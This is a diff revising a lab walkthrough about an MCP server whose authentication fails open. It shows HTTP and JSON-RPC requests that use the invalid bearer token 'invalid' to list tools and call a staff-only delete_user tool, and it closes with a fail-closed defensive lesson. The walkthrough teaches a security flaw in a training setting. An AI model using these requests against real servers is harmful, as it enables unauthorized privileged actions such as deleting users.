@@ -6,65 +6,42 @@ permalink: /labs/mcp-authentication-fails-open/
 
 # MCP Server Authentication Fails Open
 
-## Lab
+## Goal
 
-**Name:** MCP server authentication fails open
-**Goal:** Delete `carlos` using an invalid bearer token.
+Complete the lab by calling the staff-only delete operation with an invalid bearer token.
 
-## Baseline
+## Walkthrough
 
-A request without a bearer token is rejected:
+1. Send an unauthenticated request to the lab's `/mcp` endpoint. The server responds with `401 Unauthorized`; this is the expected baseline.
+2. In Burp Repeater, send `tools/list` with a deliberately invalid bearer token:
 
-```http
-POST /mcp
-Content-Type: application/json
-```
+   ```http
+   Authorization: Bearer invalid
+   Content-Type: application/json
+   ```
 
-Response:
+   ```json
+   {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
+   ```
 
-```http
-HTTP/1.1 401 Unauthorized
-```
+3. Compare the response to the unauthenticated baseline. The invalid token is accepted and the server returns a normal MCP response, rather than rejecting it.
+4. Keep that same invalid bearer value and call the staff-only tool:
 
-## Confirm the Fails-Open Behavior
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":3,
+     "method":"tools/call",
+     "params":{"name":"delete_user","arguments":{"username":"carlos"}}
+   }
+   ```
 
-A valid API key is accepted, but an unrecognized bearer token is also accepted.
+5. The response `Deleted carlos` confirms that the invalid credential passed through to an authorization context with excessive privileges. The lab is solved.
 
-```http
-Authorization: Bearer invalid
-Content-Type: application/json
-```
+## Why it works
 
-For example, `tools/list` returns normally with this unrecognized token.
+The server treats a missing credential and an unrecognized credential differently. Instead of rejecting an invalid token, it falls back to a context that can still call privileged tools.
 
-## Exploit
+## Defensive lesson
 
-Call the staff-only `delete_user` tool with the invalid token:
-
-```json
-{
-  "jsonrpc":"2.0",
-  "id":3,
-  "method":"tools/call",
-  "params": {
-    "name": "delete_user",
-    "arguments": {
-      "username": "carlos"
-    }
-  }
-}
-```
-
-The server responds:
-
-```text
-Deleted carlos
-```
-
-## Why It Works
-
-The server distinguishes between "no token" and "invalid token". An invalid token is incorrectly treated as an unauthenticated fallback with insufficient restrictions. Staff tool authorization therefore fails open.
-
-## Key Takeaway
-
-Authentication should fail closed. Any missing, malformed, expired, or unrecognized token must receive the same explicit rejection.
+Reject missing, malformed, expired, and invalid credentials before dispatching any tool. A failed authentication check must never create a more permissive fallback identity.
